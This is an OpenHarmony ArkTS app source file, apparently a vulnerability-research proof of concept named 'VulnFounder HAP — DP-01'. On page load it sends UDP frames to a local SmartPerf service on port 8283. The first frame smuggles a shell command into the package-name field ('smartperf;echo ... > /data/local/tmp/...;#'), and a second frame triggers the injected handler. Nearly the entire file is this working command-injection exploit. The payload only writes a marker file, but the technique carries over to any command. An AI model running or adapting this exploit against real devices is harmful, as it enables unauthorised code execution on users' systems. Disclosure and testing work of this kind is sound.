import socket from '@ohos.net.socket';
import hilog from '@ohos.hilog';

const DOMAIN = 0x0001;
const TAG = 'Index';
const TARGET = 'DP-01';
const MARKER = '/data/local/tmp/vf_hap_dp01_hack.txt';
const FIRST = 'set_pkgName::smartperf;echo "hack by nju" > ' + MARKER + ';#';
const SECOND = 'catch_network_traffic::x';

@Entry
@Component
struct Index {
  @State statusText: string = 'Preparing controlled socket PoC...';
  @State responseText: string = '';

  aboutToAppear(): void {
    hilog.info(DOMAIN, TAG, `HAP_POC_START ${TARGET}`);
    this.runPoc();
  }

  async runPoc(): Promise<void> {
    this.statusText = `Sending ${TARGET} UDP frames...`;
    const udp = socket.constructUDPSocketInstance();
    try {
      await udp.bind({ address: '0.0.0.0', family: 1, port: 0 });
      await udp.send({ data: FIRST, address: { address: '127.0.0.1', family: 1, port: 8283 } });
      await new Promise<void>((resolve) => setTimeout(resolve, 300));
      await udp.send({ data: SECOND, address: { address: '127.0.0.1', family: 1, port: 8283 } });
      await udp.close();
      this.statusText = `${TARGET} frames sent`;
      this.responseText = `marker=${MARKER}`;
      hilog.info(DOMAIN, TAG, `HAP_POC_SENT ${TARGET} marker=${MARKER}`);
    } catch (err) {
      const message = this.errorMessage(err);
      this.statusText = `${TARGET} send failed`;
      this.responseText = message;
      hilog.error(DOMAIN, TAG, `HAP_POC_FAIL ${TARGET}: ${message}`);
    }
  }

  private errorMessage(err: Object): string {
    if (err instanceof Error) {
      return err.message;
    }
    try {
      return JSON.stringify(err);
    } catch (_) {
      return String(err);
    }
  }

  build() {
    Column() {
      Text(`VulnFounder HAP — ${TARGET}`)
        .fontSize(22)
        .fontWeight(FontWeight.Bold)
        .margin({ top: 25, bottom: 10 })

      Text('Controlled SmartPerf UDP PoC')
        .fontSize(15)
        .fontColor('#666666')
        .margin({ bottom: 14 })

      Text(this.statusText)
        .fontSize(15)
        .fontColor('#1677FF')
        .margin({ bottom: 8 })
        .maxLines(2)

      Text(this.responseText)
        .fontSize(13)
        .fontColor('#333333')
        .margin({ left: 20, right: 20 })
        .maxLines(5)
    }
    .width('100%')
    .height('100%')
    .justifyContent(FlexAlign.Center)
  }
}
